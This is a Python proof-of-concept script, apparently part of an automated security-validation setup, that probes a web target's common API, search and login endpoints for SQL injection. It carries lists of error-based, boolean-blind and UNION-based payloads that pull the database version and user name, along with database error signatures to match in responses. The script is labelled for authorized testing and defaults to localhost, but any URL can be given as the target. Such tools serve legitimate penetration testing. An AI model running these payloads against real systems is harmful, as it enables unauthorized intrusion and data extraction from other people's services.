#!/usr/bin/env python3
"""
PoC: SQL Injection — String Interpolation in Query

Vulnerability: User-controlled input is concatenated directly into a SQL query
string (e.g., f"SELECT * FROM users WHERE id = {user_id}") without
parameterization, enabling an attacker to exfiltrate data, bypass authentication,
or in some DB configs escalate to OS command execution.

Supported databases: PostgreSQL, MySQL, SQLite, MSSQL (error-based and
UNION-based techniques).

Validation strategy:
  - Boolean-based blind: inject `' AND '1'='1` vs `' AND '1'='2` and compare
    response sizes/content
  - Error-based: inject syntax errors to detect DB error messages in response
  - UNION-based: inject UNION SELECT to extract version string / username

Usage (authorized testing only, inside Docker):
    python poc_sql_injection_001.py --target http://localhost:5000 --timeout 30

Exit codes:
    0 - CONFIRMED: SQL injection confirmed (data extracted or boolean differential)
    1 - NOT_REPRODUCED: No injection evidence
    2 - ERROR: Script error or target unreachable

IMPORTANT: Only use against systems you have explicit written authorization to test.
"""

import argparse
import sys
import time

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    print("[ERROR] SQLI-001: 'requests' library is required.")
    sys.exit(2)

VULN_ID = "SQLI-001"

# ── Payloads ──────────────────────────────────────────────────────────────────

# Error-based detection: these trigger DB syntax errors that surface in responses
ERROR_PAYLOADS = [
    "'",
    "''",
    "' --",
    "' OR '1'='1",
    "1; SELECT 1",
    "1 AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))",  # MSSQL
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",            # MySQL
    "' AND 1=CAST((SELECT version()) AS int) --",                 # PostgreSQL
]

# DB error signatures to detect in responses
DB_ERROR_SIGNATURES = [
    # Generic
    "sql syntax", "syntax error", "unclosed quotation",
    # MySQL
    "you have an error in your sql", "mysql_fetch", "mysql_num_rows",
    "warning: mysql", "supplied argument is not a valid mysql",
    # PostgreSQL
    "pg_query", "pg_exec", "pgsql", "unterminated quoted identifier",
    "invalid input syntax for type",
    # SQLite
    "sqlite3_", "sqlite error", "sqliteexception",
    # MSSQL
    "microsoft ole db provider", "odbc sql server driver", "sql server",
    "sqlexception", "incorrect syntax near",
    # Oracle
    "ora-", "oracle error",
    # General ORM
    "sqlalchemy", "hibernate", "active record",
]

# Boolean-based pairs: (true_condition, false_condition)
BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
]

# UNION-based: extract DB version/user
UNION_PAYLOADS = [
    "' UNION SELECT NULL,version(),NULL --",        # PostgreSQL / MySQL
    "' UNION SELECT NULL,@@version,NULL --",        # MySQL / MSSQL
    "' UNION SELECT NULL,sqlite_version(),NULL --", # SQLite
    "1 UNION ALL SELECT NULL,version(),NULL --",
    "1 UNION ALL SELECT NULL,user(),NULL --",
]

# ── Injection-prone endpoint patterns ─────────────────────────────────────────

INJECTION_PATHS = [
    # ID-based lookups (most common integer SQLi vector)
    "/api/users/",
    "/api/products/",
    "/api/items/",
    "/api/posts/",
    "/user/",
    "/product/",
    # Search / filter endpoints
    "/api/search",
    "/search",
    "/api/users",
    "/api/products",
    # Auth endpoints
    "/api/login",
    "/login",
    "/api/auth",
]

INJECT_PARAMS = ["id", "user_id", "product_id", "q", "search", "name", "username", "email"]


def check_error_based(session: requests.Session, target: str, timeout: int) -> dict | None:
    """Detect SQL errors surfacing in HTTP responses."""
    for path in INJECTION_PATHS:
        for payload in ERROR_PAYLOADS:
            for param in INJECT_PARAMS:
                urls_to_try = [
                    f"{target}{path}?{param}={requests.utils.quote(payload)}",
                    f"{target}{path}{requests.utils.quote(payload)}",
                ]
                for url in urls_to_try:
                    try:
                        resp = session.get(url, timeout=5, allow_redirects=False)
                        body_lower = resp.text.lower()
                        for sig in DB_ERROR_SIGNATURES:
                            if sig in body_lower:
                                return {
                                    "technique": "error-based",
                                    "url": url,
                                    "payload": payload,
                                    "signature": sig,
                                    "response_snippet": resp.text[:300],
                                }
                    except RequestException:
                        pass

                # Also try POST body injection
                try:
                    resp = session.post(
                        f"{target}{path}",
                        json={param: payload},
                        timeout=5,
                        allow_redirects=False,
                    )
                    body_lower = resp.text.lower()
                    for sig in DB_ERROR_SIGNATURES:
                        if sig in body_lower:
                            return {
                                "technique": "error-based (POST body)",
                                "url": f"{target}{path}",
                                "payload": payload,
                                "param": param,
                                "signature": sig,
                                "response_snippet": resp.text[:300],
                            }
                except RequestException:
                    pass
    return None


def check_boolean_based(session: requests.Session, target: str, timeout: int) -> dict | None:
    """Detect boolean-based blind SQLi by comparing response sizes."""
    for path in INJECTION_PATHS:
        for true_payload, false_payload in BOOLEAN_PAIRS:
            for param in INJECT_PARAMS[:4]:  # Limit to most common params
                try:
                    base_url = f"{target}{path}"
                    r_true = session.get(
                        base_url,
                        params={param: true_payload},
                        timeout=5,
                        allow_redirects=False,
                    )
                    r_false = session.get(
                        base_url,
                        params={param: false_payload},
                        timeout=5,
                        allow_redirects=False,
                    )
                    # Significant size difference = boolean discrimination
                    size_diff = abs(len(r_true.text) - len(r_false.text))
                    if size_diff > 50 and r_true.status_code != r_false.status_code:
                        return {
                            "technique": "boolean-based blind",
                            "url": base_url,
                            "param": param,
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "true_size": len(r_true.text),
                            "false_size": len(r_false.text),
                            "size_diff": size_diff,
                        }
                    # Status code difference (200 vs 400/500)
                    elif r_true.status_code == 200 and r_false.status_code in (400, 500):
                        return {
                            "technique": "boolean-based blind (status code)",
                            "url": base_url,
                            "param": param,
                            "true_payload": true_payload,
                            "false_payload": false_payload,
                            "true_status": r_true.status_code,
                            "false_status": r_false.status_code,
                        }
                except RequestException:
                    continue
    return None


def check_union_based(session: requests.Session, target: str, timeout: int) -> dict | None:
    """Detect UNION-based SQLi by looking for DB version strings in output."""
    version_patterns = [
        "postgresql", "mysql", "sqlite", "microsoft sql server",
        "mariadb", "oracle database", "8.", "5.", "14.", "15.",
    ]
    for path in INJECTION_PATHS:
        for payload in UNION_PAYLOADS:
            for param in INJECT_PARAMS[:3]:
                try:
                    resp = session.get(
                        f"{target}{path}",
                        params={param: payload},
                        timeout=5,
                        allow_redirects=False,
                    )
                    body_lower = resp.text.lower()
                    for ver in version_patterns:
                        if ver in body_lower:
                            return {
                                "technique": "union-based",
                                "url": f"{target}{path}",
                                "param": param,
                                "payload": payload,
                                "version_string": ver,
                                "response_snippet": resp.text[:300],
                            }
                except RequestException:
                    pass
    return None


def run_exploit(target: str, timeout: int) -> tuple[int, dict]:
    print(f"[*] {VULN_ID}: SQL Injection PoC")
    print(f"[*] {VULN_ID}: Target: {target}")

    session = requests.Session()

    try:
        probe = session.get(target, timeout=10)
        print(f"[*] {VULN_ID}: Target reachable (HTTP {probe.status_code})")
    except RequestException as e:
        print(f"[ERROR] {VULN_ID}: Target unreachable: {e}")
        return 2, {}

    print(f"[*] {VULN_ID}: Phase 1 — error-based detection...")
    evidence = check_error_based(session, target, timeout)
    if evidence:
        print(f"[CONFIRMED] {VULN_ID}: SQLi confirmed (error-based)")
        print(f"[CONFIRMED] {VULN_ID}: URL: {evidence['url']}")
        print(f"[CONFIRMED] {VULN_ID}: DB signature: {evidence['signature']}")
        return 0, evidence

    print(f"[*] {VULN_ID}: Phase 2 — boolean-based blind detection...")
    evidence = check_boolean_based(session, target, timeout)
    if evidence:
        print(f"[CONFIRMED] {VULN_ID}: SQLi confirmed (boolean-based blind)")
        print(f"[CONFIRMED] {VULN_ID}: URL: {evidence['url']}, size diff: {evidence.get('size_diff', '?')}")
        return 0, evidence

    print(f"[*] {VULN_ID}: Phase 3 — UNION-based extraction...")
    evidence = check_union_based(session, target, timeout)
    if evidence:
        print(f"[CONFIRMED] {VULN_ID}: SQLi confirmed (UNION-based)")
        print(f"[CONFIRMED] {VULN_ID}: Version string detected: {evidence['version_string']}")
        return 0, evidence

    print(f"[-] {VULN_ID}: No SQL injection evidence found")
    print(f"[*] {VULN_ID}: Check for raw string formatting in ORM queries (f-strings, % formatting, .format())")
    return 1, {}


def main() -> None:
    parser = argparse.ArgumentParser(
        description=f"PoC for SQL Injection ({VULN_ID})",
        epilog="For authorized security testing only.",
    )
    parser.add_argument("--target", default="http://localhost:5000")
    parser.add_argument("--timeout", type=int, default=30)
    args = parser.parse_args()

    target = args.target.rstrip("/")
    if not target.startswith(("http://", "https://")):
        print(f"[ERROR] {VULN_ID}: Target must start with http:// or https://")
        sys.exit(2)

    try:
        exit_code, results = run_exploit(target, args.timeout)
    except KeyboardInterrupt:
        print(f"\n[!] {VULN_ID}: Interrupted")
        sys.exit(2)
    except Exception as e:
        print(f"[ERROR] {VULN_ID}: Unhandled exception: {e}")
        sys.exit(2)

    if exit_code == 0:
        print(f"[CONFIRMED] {VULN_ID}: SQL injection confirmed (CVSS 7.1)")
    elif exit_code == 1:
        print(f"[NOT_REPRODUCED] {VULN_ID}: SQL injection not reproduced")
    sys.exit(exit_code)


if __name__ == "__main__":
    main()
